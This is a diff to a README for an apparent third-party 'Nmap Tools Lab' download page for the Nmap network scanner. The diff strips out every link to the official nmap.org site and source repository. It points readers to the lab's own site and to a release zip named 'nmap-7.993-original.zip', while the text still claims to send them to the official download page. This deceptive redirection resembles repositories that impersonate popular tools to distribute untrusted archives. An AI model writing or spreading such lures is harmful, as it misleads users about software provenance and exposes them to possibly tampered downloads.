@@ -8,7 +8,9 @@
 
 **A clear, independent download reference for authorized network discovery and diagnostics.**
 
-[Download from Nmap](https://nmap.org/download.html) · [Release notes](https://nmap.org/changelog.html) · [Documentation](https://nmap.org/book/man.html)
+[![Project landing page](https://img.shields.io/badge/PROJECT%20LANDING%20PAGE-0d8c96?style=for-the-badge&logo=github)](https://nmap-tools-lab.github.io/nmap-site/)
+[![Release notes](https://img.shields.io/badge/RELEASE%20NOTES-2563eb?style=for-the-badge&logo=github)](https://github.com/nmap-tools-lab/nmap-download/releases)
+[![Documentation hub](https://img.shields.io/badge/DOCUMENTATION%20HUB-334155?style=for-the-badge&logo=github)](https://github.com/nmap-tools-lab/nmap-download#useful-resources)
 
 </div>
 
@@ -24,7 +26,7 @@ Use the official Nmap download page:
 
 [![Download original ZIP](https://img.shields.io/badge/DOWNLOAD%20ORIGINAL%20ZIP-00a86b?style=for-the-badge&logo=github)](https://github.com/nmap-tools-lab/nmap-download/releases/latest/download/nmap-7.993-original.zip)
 [![Release notes](https://img.shields.io/badge/RELEASE%20NOTES-2563eb?style=for-the-badge&logo=github)](https://github.com/nmap-tools-lab/nmap-download/releases)
-[![Official download source](https://img.shields.io/badge/OFFICIAL%20SOURCE-334155?style=for-the-badge)](https://nmap.org/download.html)
+[![Project resources](https://img.shields.io/badge/PROJECT%20RESOURCES-334155?style=for-the-badge&logo=github)](https://github.com/nmap-tools-lab/nmap-download#useful-resources)
 
 The official page provides the current Windows installer, source packages, documentation, and project licensing information. Verify the SHA-256 value below and review the applicable license before installation.
 
@@ -32,12 +34,10 @@ The official page provides the current Windows installer, source packages, docum
 
 ## Useful resources
 
-- [Official Nmap downloads](https://nmap.org/download.html)
-- [Nmap reference guide](https://nmap.org/book/man.html)
-- [Nmap documentation](https://nmap.org/book/)
-- [Nmap changelog](https://nmap.org/changelog.html)
-- [Nmap source code](https://github.com/nmap/nmap)
 - [Nmap Tools Lab landing page](https://nmap-tools-lab.github.io/nmap-site/)
+- [Nmap Tools Lab release history](https://github.com/nmap-tools-lab/nmap-download/releases)
+- [Nmap Tools Lab repository](https://github.com/nmap-tools-lab/nmap-download)
+- [Nmap Tools Lab profile](https://github.com/nmap-tools-lab)
 
 ## Responsible use
 
